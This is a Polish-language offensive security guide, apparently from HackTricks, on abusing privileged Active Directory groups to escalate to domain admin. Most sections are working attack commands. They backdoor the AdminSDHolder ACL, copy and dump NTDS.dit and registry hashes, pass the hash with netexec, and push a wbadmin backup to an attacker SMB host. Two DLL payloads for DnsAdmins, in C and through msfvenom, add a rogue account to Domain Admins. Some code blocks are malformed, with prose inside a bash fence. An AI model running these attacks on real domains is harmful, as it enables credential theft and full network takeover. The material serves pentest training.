# Grupy uprzywilejowane

{{#include ../../banners/hacktricks-training.md}}

## Znane grupy z uprawnieniami administracyjnymi

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Ta grupa ma uprawnienia do tworzenia kont i grup, które nie są administratorami w domenie. Dodatkowo umożliwia lokalne logowanie do kontrolera domeny (DC).

Aby zidentyfikować członków tej grupy, wykonuje się następujące polecenie:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Dozwolone jest dodawanie nowych użytkowników oraz lokalne logowanie do DC.

## Grupa **AdminSDHolder**

Lista kontroli dostępu (ACL) grupy **AdminSDHolder** jest kluczowa, ponieważ ustala uprawnienia dla wszystkich „chronionych grup” w Active Directory, w tym grup o wysokich uprawnieniach. Ten mechanizm zabezpiecza te grupy, uniemożliwiając nieautoryzowane modyfikacje.

Atakujący mógłby to wykorzystać, modyfikując ACL grupy **AdminSDHolder** i przyznając zwykłemu użytkownikowi pełne uprawnienia. Spowodowałoby to, że użytkownik miałby de facto pełną kontrolę nad wszystkimi chronionymi grupami. Jeśli uprawnienia tego użytkownika zostaną zmienione lub usunięte, zostaną one automatycznie przywrócone w ciągu godziny ze względu na sposób działania systemu.

Polecenia do przeglądania członków i modyfikowania uprawnień obejmują:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Dostępny jest skrypt przyspieszający proces przywracania: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Więcej informacji na [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Recycle Bin

Członkostwo w tej grupie umożliwia odczyt usuniętych obiektów Active Directory, co może ujawnić wrażliwe informacje:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Dostęp do kontrolera domeny

Dostęp do plików na DC jest ograniczony, chyba że użytkownik należy do grupy `Server Operators`, co zmienia poziom uprawnień.

### Privilege Escalation

Używając `PsService` lub `sc` z Sysinternals, można sprawdzić i zmienić uprawnienia usług. Grupa `Server Operators`, na przykład, ma pełną kontrolę nad niektórymi usługami, co umożliwia wykonywanie dowolnych poleceń i privilege escalation:
```cmd
C:\> .\PsService.exe security AppReadiness
```
To polecenie ujawnia, że `Server Operators` mają pełny dostęp, co umożliwia manipulowanie usługami w celu eskalacji uprawnień.

## Backup Operators

Członkostwo w grupie `Backup Operators` zapewnia dostęp do systemu plików `DC01` z powodu uprawnień `SeBackup` i `SeRestore`. Te uprawnienia umożliwiają przeglądanie folderów, listowanie i kopiowanie plików, nawet bez jawnych uprawnień, przy użyciu flagi `FILE_FLAG_BACKUP_SEMANTICS`. W tym celu konieczne jest użycie odpowiednich skryptów.

Aby wyświetlić członków grupy, wykonaj:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Atak lokalny

Aby wykorzystać te uprawnienia lokalnie, wykonuje się następujące kroki:

1. Zaimportuj niezbędne biblioteki:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Włącz i zweryfikuj `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Uzyskaj dostęp i skopiuj pliki z ograniczonych katalogów, na przykład:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### Atak AD

Bezpośredni dostęp do systemu plików kontrolera domeny pozwala na kradzież bazy `NTDS.dit`, która zawiera wszystkie hashe NTLM użytkowników i komputerów w domenie.

#### Korzystanie z diskshadow.exe

1. Utwórz shadow copy dysku `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Skopiuj `NTDS.dit` z shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternatywnie użyj `robocopy` do kopiowania plików:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Wyodrębnij `SYSTEM` i `SAM` w celu pobrania hashów:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Pobierz wszystkie hashes z `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Po ekstrakcji: Pass-the-Hash do DA
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Użycie wbadmin.exe

1. Skonfiguruj system plików NTFS dla serwera SMB na maszynie atakującej i zbuforuj poświadczenia SMB na maszynie docelowej.
2. Użyj `wbadmin.exe` do wykonania kopii zapasowej systemu i wyodrębnienia `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

For a practical demonstration, see [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Członkowie grupy **DnsAdmins** mogą wykorzystać swoje uprawnienia do załadowania dowolnej DLL z uprawnieniami SYSTEM na serwerze DNS, często hostowanym na Domain Controllers. Ta możliwość daje znaczny potencjał do wykorzystania.

Aby wyświetlić członków grupy DnsAdmins, użyj:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Execute arbitrary DLL (CVE‑2021‑40469)

> [!NOTE]
> Ta luka umożliwia wykonanie dowolnego kodu z uprawnieniami SYSTEM w usłudze DNS (zazwyczaj na DCs). Problem został naprawiony w 2021 roku.

Members mogą spowodować, że serwer DNS załaduje dowolny DLL (lokalnie lub z zdalnego udziału), używając poleceń takich jak:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Zrestartowanie usługi DNS (co może wymagać dodatkowych uprawnień) jest konieczne, aby plik DLL został załadowany:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Po więcej szczegółów na temat tego wektora ataku zobacz ired.team.

#### Mimilib.dll

Możliwe jest także użycie mimilib.dll do wykonywania poleceń, modyfikując ją tak, aby uruchamiała określone komendy lub reverse shells. [Check this post](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) for more information.

### Rekord WPAD dla MitM

DnsAdmins mogą manipulować rekordami DNS, aby przeprowadzać ataki Man-in-the-Middle (MitM) poprzez utworzenie rekordu WPAD po wyłączeniu global query block list. Narzędzia takie jak Responder lub Inveigh mogą być użyte do spoofingu i przechwytywania ruchu sieciowego.

### Event Log Readers
Członkowie mogą uzyskiwać dostęp do dzienników zdarzeń, potencjalnie znajdując wrażliwe informacje, takie jak hasła w postaci jawnej lub szczegóły wykonania poleceń:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Uprawnienia Exchange Windows

Ta grupa może modyfikować DACLs obiektu domeny, co może skutkować przyznaniem uprawnień DCSync. Techniki eskalacji uprawnień wykorzystujące tę grupę zostały opisane szczegółowo w Exchange-AD-Privesc GitHub repo.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V Administrators

Hyper-V Administrators mają pełny dostęp do Hyper-V, który może zostać wykorzystany do przejęcia kontroli nad wirtualizowanymi Domain Controllers. Obejmuje to klonowanie działających DCs oraz wyodrębnianie hashy NTLM z pliku NTDS.dit.

### Exploitation Example

Firefox's Mozilla Maintenance Service może być wykorzystana przez Hyper-V Administrators do wykonania poleceń jako SYSTEM. Polega to na utworzeniu hard linku do chronionego pliku SYSTEM i zastąpieniu go złośliwym plikiem wykonywalnym:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Uwaga: Hard link exploitation zostało złagodzone w ostatnich aktualizacjach Windows.

## Group Policy Creators Owners

Ta grupa pozwala członkom tworzyć Group Policies w domenie. Jednak jej członkowie nie mogą stosować Group Policies do użytkowników lub grup ani edytować istniejących GPOs.

## Organization Management

W środowiskach, gdzie wdrożony jest **Microsoft Exchange**, specjalna grupa znana jako **Organization Management** ma istotne uprawnienia. Grupa ta ma przywilej **dostępu do skrzynek pocztowych wszystkich użytkowników domeny** oraz posiada **pełną kontrolę nad jednostką organizacyjną (OU) 'Microsoft Exchange Security Groups'**. Ta kontrola obejmuje grupę **`Exchange Windows Permissions`**, którą można wykorzystać do eskalacji uprawnień.

### Wykorzystywanie uprawnień i polecenia

#### Print Operators

Członkowie grupy **Print Operators** posiadają kilka przywilejów, w tym **`SeLoadDriverPrivilege`**, który pozwala im **zalogować się lokalnie do Domain Controller**, wyłączyć go oraz zarządzać drukarkami. Aby wykorzystać te przywileje, szczególnie jeśli **`SeLoadDriverPrivilege`** nie jest widoczny w niepodwyższonym kontekście, konieczne jest obejście User Account Control (UAC).

Aby wyświetlić członków tej grupy, użyj następującego polecenia PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Aby uzyskać bardziej szczegółowe techniki eksploatacji związane z **`SeLoadDriverPrivilege`**, należy zapoznać się ze specjalistycznymi źródłami dotyczącymi bezpieczeństwa.

#### Użytkownicy pulpitu zdalnego

Członkom tej grupy przyznano dostęp do komputerów za pomocą Remote Desktop Protocol (RDP). Aby wyświetlić członków tej grupy, dostępne są polecenia PowerShell:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Dalsze informacje dotyczące exploiting RDP można znaleźć w dedykowanych pentesting resources.

#### Użytkownicy zdalnego zarządzania

Członkowie mogą uzyskiwać dostęp do komputerów przez **Windows Remote Management (WinRM)**. Enumeracja tych członków jest przeprowadzana za pomocą:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
W przypadku technik eksploatacji związanych z **WinRM** należy zapoznać się z odpowiednią dokumentacją.

#### Operatorzy serwera

Ta grupa ma uprawnienia do wykonywania różnych konfiguracji na kontrolerach domeny, w tym uprawnienia do tworzenia i przywracania kopii zapasowych, zmiany czasu systemowego oraz wyłączania systemu. Aby wyenumerować członków, użyj podanego polecenia:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## Źródła <a href="#references" id="references"></a>

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
- [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
- [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
- [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
- [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [HTB: Baby — Anonymous LDAP → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)


{{#include ../../banners/hacktricks-training.md}}
